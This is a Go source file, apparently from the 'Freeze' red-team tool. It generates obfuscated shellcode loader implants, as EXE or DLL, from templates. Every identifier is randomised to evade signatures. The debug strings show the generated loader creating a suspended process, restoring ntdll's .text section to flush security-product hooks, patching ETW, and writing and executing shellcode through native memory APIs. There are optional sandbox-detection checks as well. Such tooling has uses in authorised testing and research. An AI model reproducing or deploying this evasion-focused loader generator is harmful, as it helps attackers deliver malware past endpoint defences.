package Loader

import (
	"Freeze/Struct"
	"Freeze/Utils"
	"bytes"
	"fmt"
	"log"
	"os"
	"text/template"
)

type Main struct {
	Variables map[string]string
}
type DLL struct {
	Variables map[string]string
}
type Console struct {
	Variables map[string]string
}

type Sandbox struct {
	Variables map[string]string
}

var (
	buffer bytes.Buffer
)

func DLLfunction(export string) string {
	var buffer bytes.Buffer
	DLL := &DLL{}
	DLL.Variables = make(map[string]string)
	if export != "" {
		DLL.Variables["ExportFunction"] = `//export ` + export + `
	func ` + export + `() {
		Run()
	}`
	} else {
		DLL.Variables["ExportFunction"] = ``
	}
	buffer.Reset()

	DLLExportTemplate, err := template.New("DLL").Parse(Struct.DLL_Export())
	if err != nil {
		log.Fatal(err)
	}
	if err := DLLExportTemplate.Execute(&buffer, DLL); err != nil {
		log.Fatal(err)
	}
	return buffer.String()

}

func MainFunction(shellcodeencoded string, mode string, console bool, exportable string, sandbox bool, process string) string {
	var buffer bytes.Buffer
	Main := &Main{}
	Main.Variables = make(map[string]string)
	Console := &Console{}
	Console.Variables = make(map[string]string)
	Sandbox := &Sandbox{}
	Sandbox.Variables = make(map[string]string)
	Main.Variables["process"] = process
	Main.Variables["shellcodeencoded"] = shellcodeencoded
	Main.Variables["modntdll"] = Utils.VarNumberLength(4, 9)
	Main.Variables["funcNtReadVirtualMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["modkernel32"] = Utils.VarNumberLength(4, 9)
	Main.Variables["procWriteProcessMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["procReadProcessMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["funcNtWriteVirtualMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["funcNtAllocateVirtualMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["funcNtProtectVirtualMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["procEtwNotificationRegister"] = Utils.VarNumberLength(4, 9)
	Main.Variables["procEtwEventRegister"] = Utils.VarNumberLength(4, 9)
	Main.Variables["procEtwEventWriteFull"] = Utils.VarNumberLength(4, 9)
	Main.Variables["procEtwEventWrite"] = Utils.VarNumberLength(4, 9)
	Main.Variables["PROCESS_ALL_ACCESS"] = Utils.VarNumberLength(4, 9)
	Main.Variables["errnoERROR_IO_PENDING"] = Utils.VarNumberLength(4, 9)
	Main.Variables["errERROR_IO_PENDING"] = Utils.VarNumberLength(4, 9)
	Main.Variables["Ntdllbytes"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ntdlloffset"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ntdllsize"] = Utils.VarNumberLength(4, 9)
	Main.Variables["CreateProcess"] = Utils.VarNumberLength(4, 9)
	Main.Variables["si"] = Utils.VarNumberLength(4, 9)
	Main.Variables["pi"] = Utils.VarNumberLength(4, 9)
	Main.Variables["Target"] = Utils.VarNumberLength(4, 9)
	Main.Variables["commandLine"] = Utils.VarNumberLength(4, 9)
	Main.Variables["startupInfo"] = Utils.VarNumberLength(4, 9)
	Main.Variables["readProcessMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["readProcessMemoryy"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ReadProcessMemoryy"] = Utils.VarNumberLength(4, 9)
	Main.Variables["size"] = Utils.VarNumberLength(4, 9)
	Main.Variables["procHandle"] = Utils.VarNumberLength(4, 9)
	Main.Variables["address"] = Utils.VarNumberLength(4, 9)
	Main.Variables["read"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ETW"] = Utils.VarNumberLength(4, 9)
	Main.Variables["handlez"] = Utils.VarNumberLength(4, 9)
	Main.Variables["dataAddr"] = Utils.VarNumberLength(4, 9)
	Main.Variables["i"] = Utils.VarNumberLength(4, 9)
	Main.Variables["data"] = Utils.VarNumberLength(4, 9)
	Main.Variables["nLength"] = Utils.VarNumberLength(4, 9)
	Main.Variables["datalength"] = Utils.VarNumberLength(4, 9)
	Main.Variables["handlez"] = Utils.VarNumberLength(4, 9)
	Main.Variables["processID"] = Utils.VarNumberLength(4, 9)
	Main.Variables["processHandle"] = Utils.VarNumberLength(4, 9)
	Main.Variables["strpid"] = Utils.VarNumberLength(4, 9)
	Main.Variables["hh"] = Utils.VarNumberLength(4, 9)
	Main.Variables["Ntdllbytes"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ntdllsize"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ntdlloffset"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ReadRemoteProcess"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ntdllsizefmt"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ntdlloffsetfmt"] = Utils.VarNumberLength(4, 9)
	Main.Variables["magic"] = Utils.VarNumberLength(4, 9)
	Main.Variables["processHandle"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ReadRemoteProcess"] = Utils.VarNumberLength(4, 9)
	Main.Variables["name"] = Utils.VarNumberLength(4, 9)
	Main.Variables["handle"] = Utils.VarNumberLength(4, 9)
	Main.Variables["file"] = Utils.VarNumberLength(4, 9)
	Main.Variables["x"] = Utils.VarNumberLength(4, 9)
	Main.Variables["size"] = Utils.VarNumberLength(4, 9)
	Main.Variables["loaddll"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ddhandlez"] = Utils.VarNumberLength(4, 9)
	Main.Variables["name"] = Utils.VarNumberLength(4, 9)
	Main.Variables["dllBase"] = Utils.VarNumberLength(4, 9)
	Main.Variables["dllOffset"] = Utils.VarNumberLength(4, 9)
	Main.Variables["rawr"] = Utils.VarNumberLength(4, 9)
	Main.Variables["handle"] = Utils.VarNumberLength(4, 9)
	Main.Variables["size"] = Utils.VarNumberLength(4, 9)
	Main.Variables["magic"] = Utils.VarNumberLength(4, 9)
	Main.Variables["name"] = Utils.VarNumberLength(4, 9)
	Main.Variables["nLength"] = Utils.VarNumberLength(4, 9)
	Main.Variables["bytes"] = Utils.VarNumberLength(4, 9)
	Main.Variables["addr"] = Utils.VarNumberLength(4, 9)
	Main.Variables["size"] = Utils.VarNumberLength(4, 9)
	Main.Variables["handlez"] = Utils.VarNumberLength(4, 9)
	Main.Variables["nLength"] = Utils.VarNumberLength(4, 9)
	Main.Variables["test"] = Utils.VarNumberLength(4, 9)
	Main.Variables["hProcess"] = Utils.VarNumberLength(4, 9)
	Main.Variables["WriteProcessMemory"] = Utils.VarNumberLength(4, 9)
	Main.Variables["lpBuffer"] = Utils.VarNumberLength(4, 9)
	Main.Variables["r1"] = Utils.VarNumberLength(4, 9)
	Main.Variables["e1"] = Utils.VarNumberLength(4, 9)
	Main.Variables["errnoErr"] = Utils.VarNumberLength(4, 9)
	Main.Variables["lpNumberOfBytesWritten"] = Utils.VarNumberLength(4, 9)
	Main.Variables["hProcess"] = Utils.VarNumberLength(4, 9)
	Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
	Main.Variables["nSize"] = Utils.VarNumberLength(4, 9)
	Main.Variables["data"] = Utils.VarNumberLength(4, 9)
	Main.Variables["nbr"] = Utils.VarNumberLength(4, 9)
	Main.Variables["ret"] = Utils.VarNumberLength(4, 9)
	Main.Variables["Shellcode"] = Utils.VarNumberLength(4, 9)
	Main.Variables["hexcode"] = Utils.VarNumberLength(4, 9)
	Main.Variables["shellcode"] = Utils.VarNumberLength(4, 9)
	Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
	Main.Variables["size"] = Utils.VarNumberLength(4, 9)
	Main.Variables["oldProtect"] = Utils.VarNumberLength(4, 9)
	Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
	Main.Variables["size"] = Utils.VarNumberLength(4, 9)
	Main.Variables["psapi"] = Utils.VarNumberLength(4, 9)
	Main.Variables["EnumPageFilesW"] = Utils.VarNumberLength(4, 9)

	if mode == "dll" {
		Main.Variables["Starting Function"] = exportable
	} else {
		Main.Variables["Starting Function"] = `func main(){`
	}

	if mode != "dll" && console == true {
		Console.Variables["Console"] = Utils.VarNumberLength(4, 9)
		Console.Variables["GetConsoleWindowName"] = Utils.VarNumberLength(4, 9)
		Console.Variables["ShowWindowName"] = Utils.VarNumberLength(4, 9)
		Console.Variables["getWin"] = Utils.VarNumberLength(4, 9)
		Console.Variables["showWin"] = Utils.VarNumberLength(4, 9)
		Console.Variables["hwnd"] = Utils.VarNumberLength(4, 9)
		Console.Variables["show"] = Utils.VarNumberLength(4, 9)
		Console.Variables["SW_RESTORE"] = Utils.VarNumberLength(4, 9)
		Console.Variables["SW_HIDE"] = Utils.VarNumberLength(4, 9)
		buffer.Reset()
		ConsoleTemplate, err := template.New("Console").Parse(Struct.Console())
		if err != nil {
			log.Fatal(err)

		}
		buffer.Reset()
		if err := ConsoleTemplate.Execute(&buffer, Console); err != nil {
			log.Fatal(err)
		}
		Main.Variables["Console"] = buffer.String()

		Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
		Main.Variables["size"] = Utils.VarNumberLength(4, 9)
		Main.Variables["oldProtect"] = Utils.VarNumberLength(4, 9)
		Main.Variables["lpBaseAddress"] = Utils.VarNumberLength(4, 9)
		Main.Variables["size"] = Utils.VarNumberLength(4, 9)
		Main.Variables["psapi"] = Utils.VarNumberLength(4, 9)
		Main.Variables["EnumPageFilesW"] = Utils.VarNumberLength(4, 9)

		Main.Variables["hide"] = Console.Variables["Console"] + "(true)"
		Main.Variables["DebugImport"] = `"io"`
		Main.Variables["Debug"] = `
		var (
			debugWriter io.Writer
		)
		
		func printDebug(format string, v ...interface{}) {
			debugWriter = os.Stdout
			output := fmt.Sprintf("[DEBUG] ")
			output += format +"\n"
			fmt.Fprintf(debugWriter, output, v...)
		}
	`
		Main.Variables["CreatingSuspended"] = "printDebug(\"[*] Creating Suspended Process: " + process + "\")"
		Main.Variables["ProcessIDdebug"] = Main.Variables["strpid"] + " := fmt.Sprint(" + Main.Variables["pi"] + ".ProcessId)"

		Main.Variables["ProcessID"] = "printDebug(\"[*] Suspend Process ID: \" +" + Main.Variables["strpid"] + "+ \"\")"
		Main.Variables["Creating"] = "printDebug(\"[*] Creating Handle to Suspend Process\")"

		Main.Variables["Handle"] = "printDebug(\"[*] Process Handle OK\")"

		Main.Variables["Parsing"] = "printDebug(\"[+] Parsing Our Proccess's Ntdll.dll Structure\")"
		Main.Variables["Reading"] = "printDebug(\"[+] Reading Ntdll.dll .Text Bytes and Storing Them to a Variable\")"

		Main.Variables["ntdllsizefmtdebug"] = Main.Variables["ntdllsizefmt"] + " := fmt.Sprintf(\"%X\", " + Main.Variables["ntdllsize"] + ")"
		Main.Variables["ntdlloffsetfmtdebug"] = Main.Variables["ntdlloffsetfmt"] + " := fmt.Sprintf(\"%X\", " + Main.Variables["ntdlloffset"] + ")"

		Main.Variables["NTDLL"] = "printDebug(\"[+] NTDLL .text Address In Memory: \" + string(" + Main.Variables["ntdlloffsetfmt"] + ") + \" NTDLL Size: \" + string(" + Main.Variables["ntdllsizefmt"] + "))"
		Main.Variables["Restoring"] = "printDebug(\"[+] Restoring Our Proccess's Ntdll.dll .Text Space\")"
		Main.Variables["Restored"] = "printDebug(\"[+] Hooks Flushed Out\")"
		Main.Variables["ETWdebug"] = "printDebug(\"[*] Patching ETW...\")"
		Main.Variables["Shellcodedebug"] = "printDebug(\"[*] Loading Shellcode...\")"

		Main.Variables["NtAllocateVirtualMemory"] = "printDebug(\"[*] Calling NtAllocateVirtualMemory\")"
		Main.Variables["NtWriteVirtualMemory"] = "printDebug(\"[*] Calling NtWriteVirtualMemory\")"
		Main.Variables["NtProtectVirtualMemory"] = "printDebug(\"[*] Calling NtProtectVirtualMemory\")"

	} else if (mode != "dll" && console == false) || mode == "dll" {
		Main.Variables["hide"] = ""
		Main.Variables["Console"] = ""
		Main.Variables["Debug"] = ""
		Main.Variables["DebugImport"] = ""
		Main.Variables["CreatingSuspended"] = ""
		Main.Variables["ProcessIDdebug"] = ""
		Main.Variables["ProcessID"] = ""
		Main.Variables["Creating"] = ""
		Main.Variables["Handle"] = ""
		Main.Variables["Parsing"] = ""
		Main.Variables["Reading"] = ""
		Main.Variables["ntdllsizefmtdebug"] = ""
		Main.Variables["ntdlloffsetfmtdebug"] = ""
		Main.Variables["NTDLL"] = ""
		Main.Variables["Restoring"] = ""
		Main.Variables["Restored"] = ""
		Main.Variables["ETWdebug"] = ""
		Main.Variables["Shellcodedebug"] = ""

		Main.Variables["NtAllocateVirtualMemory"] = ""
		Main.Variables["NtWriteVirtualMemory"] = ""
		Main.Variables["NtProtectVirtualMemory"] = ""
	}
	buffer.Reset()

	if sandbox == true {
		Main.Variables["SandboxCall"] = "Check()"
		Main.Variables["imports"] = `"runtime"`
		Sandbox.Variables["Domaincheck"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["DomainJoinedCheck"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["RAMCheck"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["RAMCheckSize"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["CPUcheck"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["CPU"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["domain"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["status"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["num"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["num_procs"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["minCheck"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["minimum_processors_required"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["kernel32"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["globalMemoryStatusEx"] = Utils.VarNumberLength(4, 9)
		Sandbox.Variables["memInfo"] = Utils.VarNumberLength(4, 9)
		buffer.Reset()
		SandboxTemplate, err := template.New("Sandbox").Parse(Struct.Sandbox())
		if err != nil {
			log.Fatal(err)

		}
		buffer.Reset()
		if err := SandboxTemplate.Execute(&buffer, Sandbox); err != nil {
			log.Fatal(err)
		}
		Main.Variables["Sandbox"] = buffer.String()
		buffer.Reset()
	} else {
		Main.Variables["SandboxCall"] = ""
		Main.Variables["imports"] = ""
		Main.Variables["Sandbox"] = ""
	}

	ImplantTemplate, err := template.New("Main").Parse(Struct.Main_Body())
	if err != nil {
		log.Fatal(err)
	}
	if err := ImplantTemplate.Execute(&buffer, Main); err != nil {
		log.Fatal(err)
	}
	return buffer.String()
}

func CompileFile(shellcodeencoded string, outFile string, console bool, mode string, export string, sandbox bool, process string) string {
	var exporttable string
	if mode == "dll" {
		exporttable = DLLfunction(export)
	} else {
		exporttable = ""
	}

	code := MainFunction(shellcodeencoded, mode, console, exporttable, sandbox, process)
	os.MkdirAll(outFile+"fldr", os.ModePerm)
	Utils.Writefile(outFile+"fldr/"+outFile+".go", code)
	os.Chdir(outFile + "fldr")
	fmt.Println("[+] Loader Compiled")
	return outFile
}
